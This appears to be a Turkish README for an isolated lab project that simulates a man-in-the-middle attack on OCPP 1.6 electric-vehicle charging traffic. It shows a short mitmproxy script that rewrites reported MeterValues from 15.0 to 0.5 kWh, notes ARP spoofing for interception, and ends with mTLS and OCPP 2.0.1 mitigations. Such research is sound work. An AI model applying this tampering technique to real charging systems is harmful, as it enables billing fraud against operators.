# ⚡ OCPP 1.6 MeterValue Manipülasyonu ve MitM Saldırı Simülasyonu

> **Uyarı:** Bu proje eğitim ve araştırma amaçlı geliştirilmiş bir Siber Güvenlik Laboratuvarı çalışmasıdır. Gerçek sistemler üzerinde izinsiz denenmesi yasaktır.

## 📖 Proje Özeti
Bu proje, Elektrikli Araç (EV) şarj altyapılarında yaygın olarak kullanılan **OCPP 1.6 (Open Charge Point Protocol)** protokolündeki veri bütünlüğü eksikliğini kanıtlamak amacıyla geliştirilmiştir.

Çalışma, şarj istasyonu ile merkezi yönetim sistemi (CSMS) arasına giren bir saldırganın, **Man-in-the-Middle (MitM)** tekniği kullanarak enerji tüketim verilerini (**MeterValues**) nasıl değiştirebileceğini ve fatura dolandırıcılığı yapabileceğini sanal bir laboratuvar ortamında simüle eder.

---

## 🏗️ Laboratuvar Mimarisi
Proje, **Oracle VirtualBox** üzerinde çalışan ve dış dünyadan izole edilmiş (`NatNetwork`) üç ana sanal makineden oluşmaktadır.

### Ağ Topolojisi ve Saldırı Akışı
```mermaid
graph LR
    A[VM-3: Kurban] -- "1. 15.0 kWh Tüketim" --> B(VM-2: Saldırgan Proxy)
    B -- "2. Manipülasyon (15.0 -> 0.5)" --> B
    B -- "3. 0.5 kWh Tüketim" --> C[VM-1: Hedef CSMS]
    C -- "4. Veritabanı Kaydı: 0.5 kWh" --> D[(MySQL DB)]
    style B fill:#f96,stroke:#333,stroke-width:2px
💻 Sistem Bileşenleri
1. Hedef: Merkezi Yönetim Sistemi (CSMS)
Ortam: Ubuntu Server (VM-1)

Yazılım: SteVe (Open Source OCPP Server)

Görevi: Şarj istasyonlarını yöneten ana sunucu. Manipüle edilmiş veriyi gerçek sanarak veritabanına işler.

2. Saldırgan: Man-in-the-Middle (Proxy)
Ortam: Kali Linux (VM-2)

Araçlar: mitmproxy, Python (manipulator.py)

Görevi: WebSocket trafiğini dinler. İçerisinde enerji verisi geçen paketleri yakalar ve veriyi değiştirerek sunucuya iletir.

3. Kurban: Sanal Şarj İstasyonu (CP Simulator)
Ortam: Ubuntu Desktop (VM-3)

Dosya: client.py

Görevi: Gerçek bir şarj istasyonunu taklit eder. Merkezi sisteme bağlanır ve şarj işlemini tamamladığına dair (örneğin 15.0 kWh) rapor gönderir.

⚔️ Saldırı Senaryosu ve Kod Analizi
Adım 1: Orijinal Veri (İstasyondan Çıkan)
Şarj istasyonu dürüstçe harcadığı enerjiyi raporlar:

JSON

{
    "action": "MeterValues",
    "payload": {
        "connectorId": 1,
        "meterValue": [
            {
                "sampledValue": [
                    {"value": "15.0", "unit": "kWh"} 
                ]
            }
        ]
    }
}
Adım 2: Veri Manipülasyonu (Saldırgan Scripti)
Saldırgan makinesinde çalışan Python scripti, WebSocket trafiği içindeki "15.0" değerini yakalar:

Python

# manipulator.py (Örnek Mantık)
def response(flow):
    if "MeterValues" in flow.request.content and '"15.0"' in flow.request.content:
        # Veriyi 0.5 olarak değiştir
        flow.request.content = flow.request.content.replace(b'"15.0"', b'"0.5"')
        print("[!] Veri Manipüle Edildi: 15.0 kWh -> 0.5 kWh")
Adım 3: Manipüle Edilmiş Veri (Sunucuya Giden)
Sunucunun (SteVe) teslim aldığı ve kaydettiği veri:

JSON

{
    "action": "MeterValues",
    "payload": {
        "connectorId": 1,
        "meterValue": [
            {
                "sampledValue": [
                    {"value": "0.5", "unit": "kWh"}
                ]
            }
        ]
    }
}
🚀 Kurulum ve Çalıştırma
Bu projeyi kendi laboratuvarınızda simüle etmek için aşağıdaki adımları izleyin:

Sanal Ağ Kurulumu: VirtualBox üzerinde NatNetwork oluşturun ve tüm VM'leri bu ağa bağlayın.

Sunucu (VM-1):

Java ve MySQL kurun.

SteVe projesini derleyin ve çalıştırın: mvn spring-boot:run

Saldırgan (VM-2):

mitmproxy aracını yükleyin.

Proxy modunu aktif edin ve trafiği yönlendirin (ARP Spoofing veya Gateway ayarı ile).

Kurban (VM-3):

Python ve gerekli kütüphaneleri yükleyin: pip install websockets asyncio ocpp

İstemciyi çalıştırın: python3 client.py

🔍 Bulgular ve Çözüm Önerileri
Tespit Edilen Zafiyet
Bu çalışma, standart HTTP/WebSocket üzerinden çalışan OCPP 1.6Json protokolünün, uygulama katmanında veri bütünlüğü kontrolü (Integrity Check) yapmadığını kanıtlamıştır. Mesajlar dijital olarak imzalanmadığı için araya giren saldırgan veriyi değiştirebilir.

Çözüm Önerileri
mTLS (Mutual TLS): Sadece şifreleme değil, hem sunucunun hem de istasyonun sertifika tabanlı kimlik doğrulaması yapması zorunlu hale getirilmelidir.

OCPP 2.0.1 Geçişi: Protokolün yeni sürümü, mesaj seviyesinde dijital imza ve gelişmiş güvenlik özellikleri sunmaktadır.

🛠️ Kullanılan Teknolojiler
Sanallaştırma: Oracle VirtualBox

OS: Ubuntu Server 24.04, Kali Linux 2024, Ubuntu Desktop

Diller: Python 3, Java

Kütüphaneler: ocpp, websockets, asyncio

Araçlar: mitmproxy, SteVe (OCPP Server)
